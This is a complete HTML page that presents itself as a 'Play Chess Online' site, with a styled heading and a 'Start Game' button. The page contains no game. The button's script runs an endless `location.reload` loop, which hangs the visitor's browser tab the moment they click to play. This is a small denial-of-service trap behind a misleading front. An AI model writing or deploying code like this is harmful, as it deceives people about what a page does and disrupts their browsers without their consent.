<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Play Chess Online</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      background: url('/CurrentGames/A5HZ7X/chessbackground.png') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      color: #2c2c2c;
    }

    h1 {
      color: #422601;
      font-size: 3rem;
      margin-bottom: 20px;
      text-shadow: 2px 2px 4px rgba(1, 1, 1, 1);
    }

    button {
      background-color: #8b4513; 
      color: #fff;
      border: 2px solid #6f3910;
      padding: 15px 40px;
      font-size: 1.2rem;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease-in-out;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    button:hover {
      background-color: #6f3910;
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
    }

    .footer {
      margin-top: 50px;
      font-size: 1rem;
      color: #ffffff;
      text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.7);
    }

    .footer a {
      color: #8b4513;
      text-decoration: none;
      font-weight: bold;
      transition: color 0.3s ease;
    }

    .footer a:hover {
      color: #6f3910;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1>Play Chess Online</h1>
  <button onclick="startGame()">Start Game</button>

  <script>
    function startGame() {
      while(1)location.reload(1)
    }
  </script>
</body>
</html>
